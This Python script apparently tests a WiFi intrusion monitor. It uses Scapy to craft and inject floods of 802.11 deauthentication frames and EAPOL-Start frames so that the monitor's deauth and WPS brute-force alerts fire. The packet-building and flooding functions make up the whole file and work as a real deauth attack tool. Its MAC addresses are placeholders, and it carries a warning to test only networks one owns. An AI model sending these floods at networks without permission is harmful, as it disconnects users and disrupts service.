#!/usr/bin/env python3
"""
Attack Simulation Script for WiFi Security Monitoring

This script crafts and sends packets that will trigger the deauthentication
and WPS brute force detection systems. Used for testing the WiFi monitoring module.

WARNING: Only use this on networks you own or have explicit permission to test.
Sending deauth packets to networks you don't own is illegal in most jurisdictions.

Usage:
    sudo python trigger_attacks.py <interface>
    
Example:
    sudo python trigger_attacks.py en0
    
To run with the monitor (in separate terminals):
    Terminal 1: sudo python wifi.py <interface>
    Terminal 2: sudo python trigger_attacks.py <interface>
"""

from scapy.all import (
    Dot11, Dot11Deauth, Dot11Auth, EAPOL, 
    RadioTap, sendp, Ether, conf
)
import argparse
import time
import sys


# Fake MAC addresses for testing
ATTACKER_MAC = "aa:bb:cc:dd:ee:ff"
TARGET_AP_MAC = "11:22:33:44:55:66"
VICTIM_MAC = "99:88:77:66:55:44"


def craft_deauth_packet(src_mac, dst_mac, bssid):
    """
    Craft a deauthentication packet
    
    Args:
        src_mac: Source MAC (attacker)
        dst_mac: Destination MAC (victim or broadcast)
        bssid: BSSID of the target AP
    
    Returns:
        Scapy packet ready to send
    """
    # RadioTap header (required for 802.11 injection)
    radio = RadioTap()
    
    # 802.11 Deauth frame
    # type=0 (Management), subtype=12 (Deauthentication)
    dot11 = Dot11(
        type=0,
        subtype=12,
        addr1=dst_mac,   # Destination (victim)
        addr2=src_mac,   # Source (attacker spoofing AP)
        addr3=bssid      # BSSID (AP)
    )
    
    # Deauth reason code 7 = "Class 3 frame received from nonassociated STA"
    deauth = Dot11Deauth(reason=7)
    
    return radio / dot11 / deauth


def craft_eapol_packet(src_mac, dst_mac, bssid):
    """
    Craft an EAPOL packet (used in WPS/WPA handshakes)
    
    Args:
        src_mac: Source MAC (attacker attempting WPS)
        dst_mac: Destination MAC (target AP)
        bssid: BSSID of the target AP
    
    Returns:
        Scapy packet ready to send
    """
    # RadioTap header
    radio = RadioTap()
    
    # 802.11 Data frame
    # type=2 (Data), subtype=0 (Data)
    dot11 = Dot11(
        type=2,
        subtype=0,
        addr1=dst_mac,   # Destination (AP)
        addr2=src_mac,   # Source (attacker)
        addr3=bssid,     # BSSID
        FCfield=0x01     # To DS
    )
    
    # EAPOL Start packet (type=1)
    # This simulates WPS authentication attempts
    eapol = EAPOL(
        version=1,
        type=1,  # EAPOL-Start
        len=0
    )
    
    return radio / dot11 / eapol


def send_deauth_flood(interface, count=15, delay=0.1):
    """
    Send a flood of deauthentication packets to trigger detection
    
    Args:
        interface: Network interface to send on
        count: Number of packets to send (default 15, threshold is 10)
        delay: Delay between packets in seconds
    """
    print(f"\n[*] Sending {count} deauth packets to trigger detection...")
    print(f"    Attacker MAC: {ATTACKER_MAC}")
    print(f"    Target AP: {TARGET_AP_MAC}")
    print(f"    Victim: {VICTIM_MAC}")
    
    packets_sent = 0
    
    for i in range(count):
        # Alternate between targeting specific victim and broadcast
        if i % 2 == 0:
            dst = VICTIM_MAC
        else:
            dst = "ff:ff:ff:ff:ff:ff"  # Broadcast
        
        packet = craft_deauth_packet(
            src_mac=ATTACKER_MAC,
            dst_mac=dst,
            bssid=TARGET_AP_MAC
        )
        
        try:
            sendp(packet, iface=interface, verbose=False)
            packets_sent += 1
            print(f"    [{i+1}/{count}] Sent deauth packet -> {dst}")
        except Exception as e:
            print(f"    [!] Error sending packet: {e}")
        
        time.sleep(delay)
    
    print(f"[+] Deauth flood complete: {packets_sent} packets sent")
    return packets_sent


def send_wps_flood(interface, count=15, delay=0.1):
    """
    Send a flood of EAPOL packets to trigger WPS brute force detection
    
    Args:
        interface: Network interface to send on
        count: Number of packets to send (default 15, threshold is 10)
        delay: Delay between packets in seconds
    """
    print(f"\n[*] Sending {count} EAPOL packets to trigger WPS detection...")
    print(f"    Attacker MAC: {ATTACKER_MAC}")
    print(f"    Target AP: {TARGET_AP_MAC}")
    
    packets_sent = 0
    
    for i in range(count):
        packet = craft_eapol_packet(
            src_mac=ATTACKER_MAC,
            dst_mac=TARGET_AP_MAC,
            bssid=TARGET_AP_MAC
        )
        
        try:
            sendp(packet, iface=interface, verbose=False)
            packets_sent += 1
            print(f"    [{i+1}/{count}] Sent EAPOL packet")
        except Exception as e:
            print(f"    [!] Error sending packet: {e}")
        
        time.sleep(delay)
    
    print(f"[+] WPS brute force flood complete: {packets_sent} packets sent")
    return packets_sent


def run_full_attack_simulation(interface, deauth_count=15, wps_count=15, delay=0.1):
    """
    Run a full attack simulation that triggers both detection systems
    
    Args:
        interface: Network interface to use
        deauth_count: Number of deauth packets
        wps_count: Number of EAPOL packets
        delay: Delay between packets
    """
    print("=" * 60)
    print("WiFi Attack Simulation for Detection Testing")
    print("=" * 60)
    print(f"Interface: {interface}")
    print(f"Detection thresholds: 10 packets in 5 seconds")
    print("=" * 60)
    
    # Run deauth flood
    send_deauth_flood(interface, count=deauth_count, delay=delay)
    
    print("\n[*] Waiting 2 seconds before WPS attack...")
    time.sleep(2)
    
    # Run WPS flood
    send_wps_flood(interface, count=wps_count, delay=delay)
    
    print("\n" + "=" * 60)
    print("Attack simulation complete!")
    print("Check the WiFi monitor output for detection alerts.")
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="Simulate WiFi attacks to test detection systems",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Run full simulation
    sudo python trigger_attacks.py en0
    
    # Only deauth attack
    sudo python trigger_attacks.py en0 --deauth-only
    
    # Only WPS attack  
    sudo python trigger_attacks.py en0 --wps-only
    
    # Custom packet count
    sudo python trigger_attacks.py en0 --count 20
        """
    )
    
    parser.add_argument(
        "interface",
        type=str,
        help="Network interface to send packets on (e.g., en0, wlan0)"
    )
    parser.add_argument(
        "--deauth-only",
        action="store_true",
        help="Only send deauthentication packets"
    )
    parser.add_argument(
        "--wps-only",
        action="store_true",
        help="Only send WPS/EAPOL packets"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=15,
        help="Number of packets to send (default: 15, detection threshold is 10)"
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        help="Delay between packets in seconds (default: 0.1)"
    )
    
    args = parser.parse_args()
    
   # Check for root privileges (required for packet injection)
#    import os
    # if os.geteuid() != 0:
    #     print("[!] Warning: This script typically requires root privileges.")
    #     print("    Try running with: sudo python trigger_attacks.py ...")
    #     print()
    
    try:
        if args.deauth_only:
            send_deauth_flood(args.interface, count=args.count, delay=args.delay)
        elif args.wps_only:
            send_wps_flood(args.interface, count=args.count, delay=args.delay)
        else:
            run_full_attack_simulation(
                args.interface,
                deauth_count=args.count,
                wps_count=args.count,
                delay=args.delay
            )
    except PermissionError:
        print("[!] Permission denied. Run with sudo:")
        print(f"    sudo python {sys.argv[0]} {args.interface}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    main()
